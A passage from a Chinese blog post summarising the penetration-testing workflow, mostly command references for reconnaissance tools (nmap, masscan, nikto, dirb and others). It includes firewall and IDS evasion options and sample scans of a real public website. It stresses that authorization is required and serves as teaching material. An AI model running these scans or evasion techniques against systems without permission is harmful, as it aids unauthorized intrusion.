{"title":"渗透测试流程总结","uid":"8926bf7f2d1f8630ce6b123f3513e9c4","slug":"渗透测试流程","date":"2023-01-12T03:28:53.132Z","updated":"2023-02-07T09:27:56.439Z","comments":true,"path":"api/articles/渗透测试流程.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/wallhaven-l83e5l.png","content":"<h1 id=\"渗透测试流程心得总结\"><a href=\"#渗透测试流程心得总结\" class=\"headerlink\" title=\"渗透测试流程心得总结\"></a>渗透测试流程心得总结</h1><p>因为渗透测试过程非常复杂且涉及到的知识点极多，为了防止自己遗忘同时方便快速查阅，将渗透测试全流程以及其中涉及到的各种知识总结下来</p>\n<h2 id=\"1-确定目标\"><a href=\"#1-确定目标\" class=\"headerlink\" title=\"1.确定目标\"></a>1.确定目标</h2><p>确定你要渗透的目标，这里的前提是我们得经过用户的授权，才可以对网站进行渗透。不然如果我们没有经过客户的授权而对一个网站进行渗透测试的话，这是违法的！</p>\n<p>渗透测试分为 <strong>白盒测试</strong> 和 <strong>黑盒测试</strong></p>\n<ul>\n<li>白盒测试就是在知道目标网站源码和其他一些信息的情况下对其进行渗透，有点类似于代码分析</li>\n<li>黑盒测试就是只告诉我们这个网站的url，其他什么都不告诉，然后让你去渗透，模拟黑客对网站的渗透</li>\n</ul>\n<h2 id=\"2-信息收集（灵魂！！！）\"><a href=\"#2-信息收集（灵魂！！！）\" class=\"headerlink\" title=\"2.信息收集（灵魂！！！）\"></a>2.信息收集（灵魂！！！）</h2><p>信息收集这一步及其重要，可以说信息收集的好坏直接影响了后续渗透的难易程度以及最终的结果</p>\n<p>有一句话说的很好,<strong>信息收集是渗透测的灵魂</strong></p>\n<h3 id=\"网站信息收集\"><a href=\"#网站信息收集\" class=\"headerlink\" title=\"网站信息收集\"></a>网站信息收集</h3><h4 id=\"发现活动主机\"><a href=\"#发现活动主机\" class=\"headerlink\" title=\"发现活动主机\"></a>发现活动主机</h4><h5 id=\"arp-scan\"><a href=\"#arp-scan\" class=\"headerlink\" title=\"arp-scan\"></a>arp-scan</h5><p>arp-scan是Kali Linux自带的一款ARP扫描工具。该工具可以进行单一目标扫描，也可以进行批量扫描。批量扫描的时候，用户可以通过CIDR地址范围或者列表文件的方式指定。该工具允许用户定制ARP包，构建非标准数据包。同时，该工具会自动解析Mac地址，给出MAC对应的硬<br>件厂商，帮助用户确认目标。</p>\n<p>使用方式：arp-scan option [rhost]</p>\n<p><strong>常用指令：</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">-f 从指定文件中读取主机名或地址：arp-scan -f IP.txt\n-l从网络接口配置生成地址 arp-scan -l\n-i 各扫描之间的时间差 ：arp-scan -l -i 1000\n-r 每个主机扫描次数 : arp-scan -r 5\n-V显示程序版本并退出\n-t 设置主机超时时间 : arp-scan -t 1000 10.10.10.0&#x2F;24\n-I使用网络接口 : arp-scan -I eth0\n-g不显示重复的数据\n-D显示数据包往返时间</code></pre>\n\n<p>命令<code>arp-scan -l</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimg_for_typoraimage-20221221185555318.png\" alt=\"image-20221221185555318\"></p>\n<h5 id=\"nmap\"><a href=\"#nmap\" class=\"headerlink\" title=\"nmap\"></a>nmap</h5><p>系统漏洞扫描之王-nmap</p>\n<p>NMap，也就是Network Mapper，是Linux下的网络扫描和嗅探工具包。</p>\n<p><strong>常用命令:</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nmap -sP -v 192.168.1.0&#x2F;24 &#x2F;&#x2F; 对本地网络进行扫描并列出详细信息\nnmap -sP 192.168.123.1&#x2F;24 &#x2F;&#x2F;Ping扫描\nnmap -p0 192.168.123.1&#x2F;24 &#x2F;&#x2F;无ping扫描,可避免防火墙的发现\nnmap -PS 192.168.123.1&#x2F;24 &#x2F;&#x2F;TCP Syn Ping即传输层的TCP&#x2F;IP扫描，通过发送和接收报文的形式进行扫描，在这种情况下每个端口都会轻易的被发现。\nnmap -PA 192.168.123.1&#x2F;24 &#x2F;&#x2F;很多防火墙会封锁SYN报文，所以nmap提供了SYN和ACK两种扫描方式，这两者的结合大大的提高了逃避防火墙的概率。\n#在实际中我们通常将ps和pa两个参数放到一起，这样效果会更好。\nnmap -PU 192.168.123.1&#x2F;24 &#x2F;&#x2F;使用UDP扫描，nmap会发送一个空的报文到主机，如果返回则说明设备在线\nnmap -PR 192.168.123.1&#x2F;24 &#x2F;&#x2F;ARP扫描是nmap对目标进行一个apr ping扫描的过程，尤其在内网的情况下。因为在本地局域网防火墙是不会禁止ARP请求的。所以在内网中使用apr扫描时非常有效的。\nnmap -sL 192.168.123.1&#x2F;24 &#x2F;&#x2F;列表扫描，他仅仅是列出制定网络上的每台主机，不发送任何报文给目标,但会列出一些无用的信息\n</code></pre>\n\n<p>命令<code>nmap -sn 192.168.1.0/24</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimg_for_typoraimage-20221221190048753.png\" alt=\"image-20221221190048753\"></p>\n<h5 id=\"netdiscover\"><a href=\"#netdiscover\" class=\"headerlink\" title=\"netdiscover\"></a>netdiscover</h5><p>netdiscover是一种用于收集有关网络的所有重要信息的工具。 它收集有关已连接客户端和路由器的信息。 对于连接的客户端，我们将能够知道他们的IP，MAC地址和操作系统，以及他们在其设备中打开的端口。 至于路由器，它将帮助我们了解路由器的制造商。 然后，如果我们试图破解它们，我们将能够查找可以用于客户端或路由器的漏洞。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">netdiscover -i eth0 -r 192.168.2.0&#x2F;24   \n&#x2F;&#x2F;IP地址是192.168.2.0网段，子网掩码是255.255.255.0，3个255的掩码位是24(需要网络知识基础),使用netdiscover工具对该网段进行局域网存活主机探测\n\nnetdiscover -p\n被动模式:被动模式的方法更加隐蔽,但是速度会比较慢,网卡被设置为混杂模式来侦听网络内的arp数据包进行被动式探测,这种方式就需要网络内设备发送arp包才能被探测到。</code></pre>\n\n<p>命令<code>netdiscover -i eth0 -r 192.168.1.0/24</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimg_for_typoraimage-20221221190136686.png\" alt=\"image-20221221190136686\"></p>\n<p>都可以达到目的</p>\n<h4 id=\"端口探测\"><a href=\"#端口探测\" class=\"headerlink\" title=\"端口探测\"></a>端口探测</h4><h5 id=\"masscan\"><a href=\"#masscan\" class=\"headerlink\" title=\"masscan\"></a>masscan</h5><p>masscan是为了尽可能快地扫描整个互联网而创建的，根据其作者robert graham，这可以在不到6分钟内完成，每秒大约1000万个数据包。</p>\n<p>masscan不建立完整的TCP连接，收到SYN&#x2F;ACK之后，发送RST结束连接。选项–banners除外。</p>\n<p><code>masscan &lt;IP地址/范围&gt; -p端口选项 </code></p>\n<p><strong>常用命令</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">masscan --rate&#x3D;10000 -p 1-65535 192.168.1.132 &#x2F;&#x2F;以10000的速率对192.168.1.132的所有端口扫描\nmasscan -p80,8080-8100 10.0.0.0&#x2F;8 &#x2F;&#x2F;扫描指定网段的80和8080-8100之间的端口\nmasscan 10.0.0.0&#x2F;8 -p80 --banners --source-ip x.x.x.x &#x2F;&#x2F;完成TCP连接的同时获取目标应用程序的Banner信息\nmasscan 222.182.111.1&#x2F;24 -p80 &#x2F;&#x2F;扫描某一个端口\nmasscan 222.182.111.1&#x2F;24 -p80,81,8080 &#x2F;&#x2F;扫描多个端口\nmasscan 222.182.111.1&#x2F;24 -p22-25 &#x2F;&#x2F;扫描多个端口\nmasscan 222.182.111.1&#x2F;24 -p80 --rate 100000 &#x2F;&#x2F;指定扫描速度(每秒扫描100000个数据包)\nmasscan 222.182.111.1&#x2F;24 -p80 --excludefile &#x2F;root&#x2F;target.txt  &#x2F;&#x2F;指定不扫描某文件内的ip\nmasscan 222.182.111.1&#x2F;24 -p80 &gt; &#x2F;root&#x2F;results.txt  &#x2F;&#x2F;指定扫描结果保存在某一文件\nmasscan 222.182.111.1&#x2F;24 -p0-65535 --rate 100000 &#x2F;&#x2F;扫描所有端口</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">IP地址范围，有三种有效格式：\n1、单独的IPv4地址\n2、类似&quot;10.0.0.1-10.0.0.233&quot;的范围地址\n3、CIDR地址类似于&quot;0.0.0.0&#x2F;0&quot;，多个目标可以用逗号隔开\n\n-p &lt;ports,–ports &gt; 指定端口进行扫描\n–banners 获取banner信息，支持少量的协议\n–rate 指定发包的速率\n-c , --conf 读取配置文件进行扫描\n–echo将当前的配置重定向到一个配置文件中\n-e , --adapter 指定用来发包的网卡接口名称\n–adapter-ip 指定发包的IP地址\n–adapter-port 指定发包的源端口\n–adapter-mac 指定发包的源MAC地址\n–router-mac 指定网关的MAC地址\n–exclude &lt;ip&#x2F;range&gt;IP地址范围黑名单，防止masscan扫描\n–excludefile 指定IP地址范围黑名单文件\n–includefile，-iL 读取一个范围列表进行扫描\n–ping扫描应该包含ICMP回应请求\n–append-output 以附加的形式输出到文件\n–iflist 列出可用的网络接口，然后退出–retries 发送重试的次数，以1秒为间隔\n–nmap打印与nmap兼容的相关信息\n–http-user-agent 设置user-agent字段的值\n–show[open,close] 告诉要显示的端口状态，默认是显示开放端口\n–noshow [open,close] 禁用端口状态显示\n–pcap 将接收到的数据包以libpcap格式存储\n–regress 运行回归测试，测试扫描器是否正常运行\n–ttl 指定传出数据包的TTL值，默认为255\n–wait 指定发送完包之后的等待时间，默认为10秒\n–offline 没有实际的发包，主要用来测试开销\n-sL 不执行扫描，主要是生成一个随机地址列表\n–readscan 读取从-oB生成的二进制文件，可以转化为XML或者JSON格式\n–connection-timeout 抓取banners时指定保持TCP连接的最大秒数，默认是30秒。</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221195222999.png\" alt=\"image-20221221195222999\"></p>\n<h5 id=\"nmap-1\"><a href=\"#nmap-1\" class=\"headerlink\" title=\"nmap\"></a>nmap</h5><p>Nmap（Network Mapper，网络映射器）是一款开放源代码的网络探测和安全审核工具，俗称扫描器之王。它的设计目标是快速地扫描大型网络，当然用它扫描单个主机也没有问题。Nmap以新颖的方式使用原始IP报文来发现网络上有哪些主机，那些主机提供什么服务（应用程序名和版本），那些服务运行在什么操作系统（包括版本信息），它们使用什么类型的报文过滤器&#x2F;防火墙，以及一堆其它功能。虽然Nmap通常用于安全审核， 许多系统管理员和网络管理员也用它来做一些日常的工作，比如查看整个网络的信息，管理服务升级计划，以及监视主机和服务的运行。</p>\n<p>命令大全:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nmap -sT 192.168.96.4  &#x2F;&#x2F;TCP连接扫描，不安全，慢\nnmap -sS 192.168.96.4  &#x2F;&#x2F;SYN扫描,使用最频繁，安全，快\nnmap -Pn 192.168.96.4  &#x2F;&#x2F;目标机禁用ping，绕过ping扫描\nnmap -sU 192.168.96.4  &#x2F;&#x2F;UDP扫描,慢,可得到有价值的服务器程序\nnmap -sI 僵尸ip 目标ip  &#x2F;&#x2F;使用僵尸机对目标机发送数据包\nnmap -sA 192.168.96.4  &#x2F;&#x2F;检测哪些端口被屏蔽\nnmap 192.168.96.4 -p &lt;portnumber&gt;  &#x2F;&#x2F;对指定端口扫描\nnmap 192.168.96.1&#x2F;24 &#x2F;&#x2F;对整个网段的主机进行扫描\nnmap 192.168.96.4 -oX myscan.xml &#x2F;&#x2F;对扫描结果另存在myscan.xml\nnmap -T1~6 192.168.96.4  &#x2F;&#x2F;设置扫描速度，一般T4足够。\nnmap -sV 192.168.96.4  &#x2F;&#x2F;对端口上的服务程序版本进行扫描\nnmap -O 192.168.96.4  &#x2F;&#x2F;对目标主机的操作系统进行扫描\nnmap -sC &lt;scirptfile&gt; 192.168.96.4  &#x2F;&#x2F;使用脚本进行扫描，耗时长\nnmap -A 192.168.96.4  &#x2F;&#x2F;强力扫描，耗时长\nnmap -6 ipv6地址   &#x2F;&#x2F;对ipv6地址的主机进行扫描\nnap -f 192.168.96.4  &#x2F;&#x2F;使用小数据包发送，避免被识别出\nnmap –mtu &lt;size&gt; 192.168.96.4 &#x2F;&#x2F;发送的包大小,最大传输单元必须是8的整数\nnmap -D &lt;假ip&gt; 192.168.96.4 &#x2F;&#x2F;发送参杂着假ip的数据包检测\nnmap --source-port &lt;portnumber&gt; &#x2F;&#x2F;针对防火墙只允许的源端口\nnmap –data-length: &lt;length&gt; 192.168.96.4 &#x2F;&#x2F;改变发生数据包的默认的长度，避免被识别出来是nmap发送的。\nnmap -v 192.168.96.4  &#x2F;&#x2F;显示冗余信息(扫描细节)\nnmap -sn 192.168.96.4  &#x2F;&#x2F;对目标进行ping检测，不进行端口扫描（会发送四种报文确定目标是否存活,）\nnmap -sP 192.168.96.4  &#x2F;&#x2F;仅仅对目标进行ping检测。\nnmap -n&#x2F;-p 192.168.96.4  &#x2F;&#x2F;-n表示不进行dns解析，-p表示要\nnmap --system-dns 192.168.96.4  &#x2F;&#x2F;扫描指定系统的dns服务器\nnmap –traceroute 192.168.96.4  &#x2F;&#x2F;追踪每个路由节点。\nnmap -PE&#x2F;PP&#x2F;PM: 使用ICMP echo, timestamp, and netmask 请求包发现主机。\nnmap -sP 192.168.96.4       &#x2F;&#x2F;主机存活性扫描，arp直连方式。\nnmap -iR [number]       &#x2F;&#x2F;对随机生成number个地址进行扫描。</code></pre>\n\n<p><strong>常用:</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nmap –sS -p 端口号 -v IP &#x2F;&#x2F;扫描指定IP开放端口\nnmap IP -v -p 1-65535 &#x2F;&#x2F;指定端口号1-65535，显示扫描过程\nnmap IP -p 53,161 &#x2F;&#x2F;只扫描53，161端口\nnmap –Pn&#x2F;P0 -A IP &#x2F;&#x2F;穿透防火墙扫描\nnmap -F IP -v &#x2F;&#x2F;快速扫描\nnmap --script&#x3D;vuln IP &#x2F;&#x2F;使用vuln脚本进行常见的漏洞扫描\nnmap -sV -v IP &#x2F;&#x2F;指纹识别扫描，扫描系统和程序版本号检测，并且输出详细信息\nnmap -sL -R IP&#x2F;24 -v &#x2F;&#x2F;扫描整个C段，反向域名解析\nnmap -p 80,443,445 -sV -A ip &#x2F;&#x2F;对指定端口进行精细扫描\nnmap -sV -T4 -O -p 80,22 192.168.15.152 &#x2F;&#x2F;常用端口扫描,版本探测和操作系统识别</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221195410872.png\" alt=\"image-20221221195410872\"></p>\n<h4 id=\"指纹识别\"><a href=\"#指纹识别\" class=\"headerlink\" title=\"指纹识别\"></a>指纹识别</h4><h5 id=\"whatweb\"><a href=\"#whatweb\" class=\"headerlink\" title=\"whatweb\"></a>whatweb</h5><p>whatweb 是kali中网站指纹识别的工具，使用Ruby语言开发。whatweb可识别web技术，包括内容管理系统(CMS)、博客平台、统计&#x2F;分析包、JavaScript库，Web服务器和嵌入式设备等。它有超过900个插件，每个插件都能识别不同的东西。Whatweb还可以识别版本号，电子邮件地址、账户ID、Web框架模块，SQL错误等。</p>\n<p>WhatWeb可以隐秘、快速、彻底或缓慢扫描。WhatWeb支持攻击级别来控制速度和可靠性之间的权衡。当在浏览器中访问网站时，该交易包含许多关于Web技术为该网站提供支持的提示。有时，单个网页访问包含足够的信息来识别网站，但如果没有，WhatWeb可以进一步询问网站。默认的攻击级别称为“被动”，速度最快，只需要一个网站的HTTP请求。这适用于扫描公共网站。在渗透测试中开发了更积极的模式。</p>\n<p>用法： <strong>weatweb 域名</strong></p>\n<ul>\n<li>-i 指定要扫描的文件</li>\n<li>-v 详细显示扫描的结果</li>\n<li>-a 指定运行级别</li>\n</ul>\n<p><strong>常用指令:</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">whatweb 网址 &#x2F;&#x2F;单个目标\nwhatweb -v 192.168.1.100 &#x2F;&#x2F;详细输出\nwhatweb -input-file&#x3D;路径 or whatweb -i 路径 &#x2F;&#x2F;从外部导入目标数据进行批量探测\nwhatweb -a 等级 域名 （可以和-v参数结合使用)\nwhatweb --no-errors -t 255 内网网段 （可以和-a和-v参数结合使用) &#x2F;&#x2F;快速本地扫描（扫描内网主机）\nwhatweb http:&#x2F;&#x2F;www.baidu.com --log-xml&#x3D;baidu.xml &#x2F;&#x2F;将扫描结果导出至文件内\nwhatweb -l &#x2F;&#x2F;列出所有插件\n</code></pre>\n\n<p>参数说明:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">-i : 指定要扫描的文件\n-v : 详细显示扫描的结果\n-a : 指定运行级别（1-4）\n\tstealthy 每个目标发送一次http请求，并且会跟随重定向\n\tunused 不可用（从2011年开始，此参数就是在开发状态\n\taggressive 每个目标发送少量的http请求，这些请求时根据参数为1时结果\t 确定的\n\theavy 每个目标会发送大量的http请求，会去尝试每一个插件\n–log-brief&#x3D;FILE 简要的记录，每个网站只记录一条返回信息\n–log-verbose&#x3D;FILE 详细输出\n–log-xml&#x3D;FILE 返回XML格式的日志\n–log-json&#x3D;FILE 以 json 格式记录日志\n–log-json-verbose&#x3D;FILE 记录详细的json日志\n–log-magictree&#x3D;FILE XML的树形结构</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221201152087.png\" alt=\"image-20221221201152087\"></p>\n<h4 id=\"目录扫描\"><a href=\"#目录扫描\" class=\"headerlink\" title=\"目录扫描\"></a>目录扫描</h4><h5 id=\"dirb\"><a href=\"#dirb\" class=\"headerlink\" title=\"dirb\"></a>dirb</h5><p>dirb是一个基于字典的web目录扫描工具，会用递归的方式来获取更多的目录，它还支持代理和http认证限制访问的网站</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>一些参考文章</p>\n<p><a href=\"https://blog.csdn.net/weixin_44912169/article/details/105655195\">https://blog.csdn.net/weixin_44912169/article/details/105655195</a></p>\n<p><a href=\"https://blog.csdn.net/liver100day/article/details/121394188\">https://blog.csdn.net/liver100day/article/details/121394188</a></p></blockquote>\n<p><strong>对目标进行基本的扫描</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">dirb http:&#x2F;&#x2F;192.168.186.131&#x2F;  #192.168.186.131为目标IP地址</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230105232601216.png\" alt=\"image-20230105232601216\"></p>\n<p><strong>列举具有特定扩展名列表的目录</strong></p>\n<p>在很多情况下，我们需要在目标服务器上提取特定扩展名的目录，然后可以使用dirb扫描的-X参数。此参数接受文件扩展名，然后在目标服务器或计算机上搜索给定的扩展名文件。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">dirb http:&#x2F;&#x2F;192.168.186.131&#x2F; -X .php #192.168.186.131为目标IP地址，.php为我们需要搜索的指定扩展名文件</code></pre>\n\n<p><strong>将输出保存到磁盘</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">dirb http:&#x2F;&#x2F;192.168.186.131&#x2F; -o output.txt #192.168.186.131为目标IP地址， output.txt为将输出保存的文件名</code></pre>\n\n<p><strong>使用&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt 字典来扫描Web服务</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">dirb http:&#x2F;&#x2F;192.168.1.116 &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt </code></pre>\n\n\n\n<h5 id=\"nikto\"><a href=\"#nikto\" class=\"headerlink\" title=\"nikto\"></a>nikto</h5><p>基于perl语言开发的web页面扫描器。其特点扫描全面，速度快。</p>\n<p>Nikto是一个开源的WEB扫描评估软件，可以对Web服务器进行多项安全测试，能在230多种服务器上扫描出 2600多种有潜在危险的文件、CGI及其他问题。Nikto可以扫描指定主机的WEB类型、主机名、指定目录、特定CGI漏洞、返回主机允许的 http模式等。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>官方网站</p>\n<p><a href=\"https://link.zhihu.com/?target=https://cirt.net/Nikto2\">https://cirt.net/Nikto2</a></p>\n<p>Github源码</p>\n<p><a href=\"https://link.zhihu.com/?target=https://github.com/sullo/nikto\">https://github.com/sullo/nikto</a></p>\n<p>英文文档</p>\n<p><a href=\"https://link.zhihu.com/?target=https://cirt.net/nikto2-docs/\">https://cirt.net/nikto2-docs/</a></p></blockquote>\n<p><strong>普通扫描</strong></p>\n<p>对目标进行扫描，参数是 host，host 后可跟 ip 地址，也可跟域名 url 的形式</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nikto -h baidu.com\nnikto -host http:&#x2F;&#x2F;172.168.1.105</code></pre>\n\n<p><strong>扫描https网站</strong></p>\n<p>nikto默认扫描会目标80端口，http协议，我们可以控制参数使得nikto对目标https协议，443端口进行扫描，并检查 ssl 一些常见的问题</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nikto -host www.baidu.com -port 443 -ssl\nnikto -host http:&#x2F;&#x2F;172.168.1.105 -ssl -port 443</code></pre>\n\n<p><strong>指定目录进行扫描</strong></p>\n<p>有时候我们只需要扫描网站下的某个子目录，使用-c 参数指定扫描的目录，使用-c all 可进行目录爆破，并扫描</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nikto -host http:&#x2F;&#x2F;192.168.1.7 -c &#x2F;dvwa</code></pre>\n\n<p><strong>多目标扫描</strong></p>\n<p>nikto支持多个目标进行扫描，将多个地址写入到文本中，通过- host参数+文本的方式即可统一进行扫描</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nikto -host list.txt</code></pre>\n\n<p><strong>其他功能</strong></p>\n<p>以输出html文件格式输出扫描结果，具体命令如下：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nikto -host http:&#x2F;&#x2F;www.example.com -o result.html -F html</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora4c1acae4e5d041d5bfdad00114cc6411.png\" alt=\"在这里插入图片描述\"></p>\n<p><strong>IDS 躲避</strong></p>\n<p>nikto 在扫描过程中也可以使用它自带的 ids 躲避规则，参数是 - evasion，nikto 提供了八种躲避规则，通过 man 手册可查看详细信息</p>\n<table>\n<thead>\n<tr>\n<th>1</th>\n<th>随机的 url 编码</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>2</td>\n<td>只选择路径</td>\n</tr>\n<tr>\n<td>3</td>\n<td>提前结束 url</td>\n</tr>\n<tr>\n<td>4</td>\n<td>优先考虑长随机字符串</td>\n</tr>\n<tr>\n<td>5</td>\n<td>参数欺骗</td>\n</tr>\n<tr>\n<td>6</td>\n<td>使用 tab 作为命令分隔符</td>\n</tr>\n<tr>\n<td>7</td>\n<td>使用变化的 url</td>\n</tr>\n<tr>\n<td>8</td>\n<td>使用 windows 路径分隔符。</td>\n</tr>\n</tbody></table>\n<p>使用方法直接 evasion 后跟序号即可</p>\n<p>使用 ids 躲避规则的123456 条对百度进行了扫描</p>\n<p><code>nikto -host https://www.baidu.com -ssl -port 443 -evasion 123456</code></p>\n<p><strong>使用代理扫描</strong></p>\n<p>扫描目标时，部分目标部署了防护设备，为避免暴露 ip可以使用代理进行扫描，nikto 支持设置代理，参数是 - useproxy。在使用时需要配合其他代理工具（比如proxychains）使用</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nikto -h https:&#x2F;&#x2F;www.baidu.com -useproxy http:&#x2F;&#x2F;127.0.0.1:1080</code></pre>\n\n\n\n<h5 id=\"nmap-2\"><a href=\"#nmap-2\" class=\"headerlink\" title=\"nmap\"></a>nmap</h5><p>nmap加载脚本引擎扫描目录</p>\n<p><code>nmap --script=http-enum ip/url</code></p>\n<h5 id=\"dirbuster\"><a href=\"#dirbuster\" class=\"headerlink\" title=\"dirbuster\"></a>dirbuster</h5><p>目录暴力破解,图形化工具</p>\n<p><code>dirbuster</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101231901147.png\" alt=\"image-20230101231901147\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230101232037466.png\" alt=\"image-20230101232037466\"></p>\n<p>dirbuster字典位置<code>/usr/share/wordlists/dirbuster</code></p>\n<h5 id=\"dirsearch\"><a href=\"#dirsearch\" class=\"headerlink\" title=\"dirsearch\"></a>dirsearch</h5><p>dirsearch是一个基于python3的命令行工具，常用于暴力扫描页面结构，包括网页中的目录和文件。相比其他扫描工具disearch的特点是：</p>\n<ul>\n<li>支持HTTP代理</li>\n<li>多线程</li>\n<li>支持多种形式的网页（asp,php）</li>\n<li>生成报告（纯文本，JSON）</li>\n<li>启发式检测无效的网页</li>\n<li>递归扫描用户代理随机化</li>\n<li>批量处理</li>\n<li>扫描器与字典（注：字典必须是文本文件）</li>\n</ul>\n<p><strong>常用指令:</strong></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" 